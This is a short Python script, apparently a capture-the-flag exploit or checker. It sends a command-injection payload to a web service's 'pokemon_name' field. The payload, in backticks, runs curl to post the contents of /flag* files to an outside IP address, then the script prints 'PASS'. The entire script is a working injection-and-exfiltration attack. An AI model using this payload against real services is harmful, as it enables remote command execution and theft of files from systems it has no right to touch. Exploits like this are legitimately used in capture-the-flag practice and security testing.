#!/usr/bin/env python3

import requests
import sys
import re

host = sys.argv[1]

payload = '`curl -XPOST http://152.42.178.112:5555/ -d "flag=$(cat /flag*)"`'

try:
    r = requests.post("http://" + host + ":10000/", data={'pokemon_name': payload})
except:
    print("Error")
    exit(1)

try:
    print(r.json())
except:
    pass
print("PASS", flush=True)